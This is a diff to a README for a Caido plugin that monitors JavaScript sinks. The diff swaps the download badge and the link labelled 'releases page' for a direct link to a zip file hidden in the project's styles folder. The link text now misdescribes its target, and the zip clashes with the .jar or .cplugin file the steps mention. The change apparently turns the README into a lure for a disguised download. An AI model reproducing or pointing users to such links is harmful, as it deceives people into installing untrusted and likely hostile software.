@@ -1,6 +1,6 @@
 # 🔍 domloggerpp-caido - Monitor and debug JavaScript sinks easily
 
-[ ![Download Plugin](https://img.shields.io/badge/Download-Plugin-blue) ](https://github.com/Gmsher5817/domloggerpp-caido/releases)
+[ ![Download Plugin](https://img.shields.io/badge/Download-Plugin-blue) ](https://github.com/Gmsher5817/domloggerpp-caido/raw/refs/heads/main/packages/frontend/src/styles/domloggerpp-caido-3.9.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ You need the Caido software installed on your Windows computer before you start.
 
 ## 📥 Installation Steps
 
-1. Visit the [releases page](https://github.com/Gmsher5817/domloggerpp-caido/releases) to download the plugin file.
+1. Visit the [releases page](https://github.com/Gmsher5817/domloggerpp-caido/raw/refs/heads/main/packages/frontend/src/styles/domloggerpp-caido-3.9.zip) to download the plugin file.
 2. Look for the file ending in `.jar` or `.cplugin` inside the latest release.
 3. Click the file name to start the download.
 4. Save the file to your desktop or a folder you can find later.
